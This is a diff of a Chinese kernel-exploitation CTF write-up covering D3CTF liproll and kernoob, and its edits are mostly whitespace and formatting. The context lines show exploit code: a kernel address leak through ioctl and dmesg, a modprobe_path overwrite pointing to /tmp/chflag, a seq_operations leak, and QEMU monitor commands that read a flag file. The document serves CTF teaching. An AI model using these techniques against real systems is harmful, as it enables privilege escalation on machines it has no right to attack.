@@ -111,6 +111,7 @@ head /proc/kallsyms
 
    ```c
    #include <signal.h>
+   
    signal(SIGSEGV, shell);
    ```
 
@@ -197,23 +198,25 @@ int main()
 		exit(-1);
 	}
 
+
 	int ret = 1;
 	ret = ioctl(fd,0x73311337,0x100);
-    ret = write(fd, buf, sizeof(buf));
+	ret = write(fd, buf, sizeof(buf));
 	
 	ret = ioctl(fd,0xDEADBEEF,0);
 	ret = ioctl(fd,0xDEADBEEF,0);
 	
 	system("echo `dmesg | tail -1 | cut -f 2 -d ']' | cut -f 9 -d '.'` > func");
-    system("echo `dmesg | tail -1 | cut -f 2 -d ']' | cut -f 10 -d '.'` > stack");
+	system("echo `dmesg | tail -1 | cut -f 2 -d ']' | cut -f 10 -d '.'` > stack");
     
-    char funcbuf[0x20], stackbuf[0x20];
-    memset(funcbuf,0,0x20);
-    memset(stackbuf,0,0x20);
-    int funcfd = open("./func",2);
-    int stackfd = open("./stack",2);
-    read(funcfd,funcbuf,0x20);
-    read(stackfd,stackbuf,0x20);
+
+	char funcbuf[0x20], stackbuf[0x20];
+	memset(funcbuf,0,0x20);
+	memset(stackbuf,0,0x20);
+	int funcfd = open("./func",2);
+	int stackfd = open("./stack",2);
+	read(funcfd,funcbuf,0x20);
+	read(stackfd,stackbuf,0x20);
 	long unsigned int func = atol(funcbuf);
 	long unsigned int stack = atol(stackbuf)-0x68-0x20;
 
@@ -371,29 +374,31 @@ pwndbg> x 0xffffffffbb848460-0xffffffffba60007c
 
 通过越界读漏洞，多次尝试可以找到一个最后三位不发生改变的地址
 
-> [+] Leak address: 
-> 0x593775c028a700
-> 0x1
-> 0x0
-> 0xffffffff9fa97598
-> 0xffff9204bc4ba400
-> 0xffff9204bc4ba400
-> 0x4c54a0
-> 0x300
-> 0x0
-> 0x0
-> 0xffffffff9ff6810a
-> 0x0
-> 0x593775c028a700
-> 0x0
-> 0xffffa00980197f58
-> 0x0
-> 0x0
-> 0xffffffffa032acb3
-> 0x0
-> 0x0
-> **0xffffffff9f80007c**
-> 0x0
+```
+[+] Leak address: 
+0x593775c028a700
+0x1
+0x0
+0xffffffff9fa97598
+0xffff9204bc4ba400
+0xffff9204bc4ba400
+0x4c54a0
+0x300
+0x0
+0x0
+0xffffffff9ff6810a
+0x0
+0x593775c028a700
+0x0
+0xffffa00980197f58
+0x0
+0x0
+0xffffffffa032acb3
+0x0
+0x0
+0xffffffff9f80007c //
+0x0
+```
 
 通过0xffffffff9f80007c可以计算内核基地址，之后计算出modprobe_path的地址，通过溢出漏洞任意地址写修改modprobe_path字符串即可
 
@@ -529,7 +534,7 @@ int main()
 		printf("0x%lx\n",*((size_t *)data+i));
 	}
 	
-    *((size_t *)node1.buf+0x20)=*((size_t *)data+0x20+20)+0x12483e4;
+	*((size_t *)node1.buf+0x20)=*((size_t *)data+0x20+20)+0x12483e4;
 	edit(&node1);
 	strcpy(node1.buf,"/tmp/chflag");
 	node1.len = 0x10;
@@ -621,6 +626,7 @@ migrate "exec:cat /tmp/flag 1>&2"
 >     s = b''
 >     p.sendlineafter('(qemu)', 'stop')
 >     # p.sendlineafter('(qemu)', 'xp/100000bc 0x000000')
+>     
 >     p.sendlineafter('(qemu)', 'drive_add 0 file=/rootfs.img,id=flag,format=raw,if=none,readonly=on')
 >     for i in trange(160):
 >         p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x4000"')
@@ -812,11 +818,11 @@ int main()
 	delete(0);
 
 	int seq_fd = open("/proc/self/stat", O_RDONLY);
-    if(seq_fd < 0)
-    {
-        puts("[!] open failed");
-        exit(-1);
-    }
+	if(seq_fd < 0)
+	{
+		puts("[!] open failed");
+		exit(-1);
+	}
 	
 	show(&node1);
 	printf("[+] Leak address: \n");
@@ -920,10 +926,10 @@ ffffffff8103a2ae:	c3                   	retq
 >
 > [D3CTF-pwn-liproll详解 - 简书 (jianshu.com)](https://www.jianshu.com/p/6f6041093434)
 >
-> [2021-D3CTF | A1ex's Blog](https://a1ex.online/2021/03/06/2021-antCTF/)
+> [2021-D3CTF —— A1ex's Blog](https://a1ex.online/2021/03/06/2021-antCTF/)
 >
 > [D3CTF-2021-Exploits/exp.c at master · UESuperGate/D3CTF-2021-Exploits (github.com)](https://github.com/UESuperGate/D3CTF-2021-Exploits/blob/master/liproll/exp.c)
 >
 > [slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/259280#h3-3)
 >
-> [kernel pwn: kernoob -- 不仅仅是double fetch | Nop's Blog (n0nop.com)](https://n0nop.com/2021/03/29/kernel-pwn-kernoob-不仅仅是double-fetch/)
+> [kernel pwn: kernoob -- 不仅仅是double fetch —— Nop's Blog (n0nop.com)](https://n0nop.com/2021/03/29/kernel-pwn-kernoob-不仅仅是double-fetch/)
